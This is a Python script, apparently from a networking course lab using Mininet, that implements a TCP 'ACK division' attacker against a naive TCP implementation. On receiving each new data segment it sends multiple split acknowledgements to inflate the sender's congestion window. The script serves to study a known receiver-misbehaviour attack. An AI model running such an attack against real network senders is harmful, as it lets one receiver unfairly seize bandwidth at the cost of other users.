from naive_tcp import *

class ACK_Division_Attacker(TCP_Client):
    def __init__(self, num_division, host):
        self.last_acked = 0
        self.received_packets = deque()
        self.num_division = num_division
        
        if host == 'h1':
            self.src_ip = H1_ADDR
            self.dst_ip = H2_ADDR
            self.src_port = H1_PORT
            self.dst_port = H2_PORT

        if host == 'h2':
            self.src_ip = H2_ADDR
            self.dst_ip = H1_ADDR
            self.src_port = H2_PORT
            self.dst_port = H1_PORT

    def receive(self):
        if len(self.received_packets) == 0:
            return
        
        # For each new data segment, we divide the ACK and reply
        pkt = self.received_packets.popleft()[0]
        new_seq = pkt[scp.TCP].seq
        if new_seq > self.last_acked:
            # New data segment received
            payload_len = len(pkt[scp.TCP].payload)
            for i in xrange(self.num_division):
                ack_no = new_seq + i * (payload_len / self.num_division)
                self.send_ack(ack_no)

    def start_attack(self):
        while True:
            self.receive()

    def start(self):
        listen_t = threading.Thread(target=self.listen)
        listen_t.start()
        self.start_attack()

if __name__ == "__main__":
    def check_num_division(val):
        ival = int(val)
        if ival <= 0 or ival > MSS:
            raise argparse.ArgumentTypeError("%s is an invalid num_division value" % val)
        return ival    
    parser = argparse.ArgumentParser(description="ACK Division Attacker.")
    parser.add_argument('--num-division', dest='num_division',
                        required=True, type=check_num_division,
                        help="The number of pieces the attacker divides the received\
                                ACKs into.")
    parser.add_argument('--host', dest='host',
                        required=True,
                        help="Mininet host (`h1` or `h2`)")

    args = parser.parse_args()
    attacker = ACK_Division_Attacker(args.num_division, args.host)
    attacker.start()
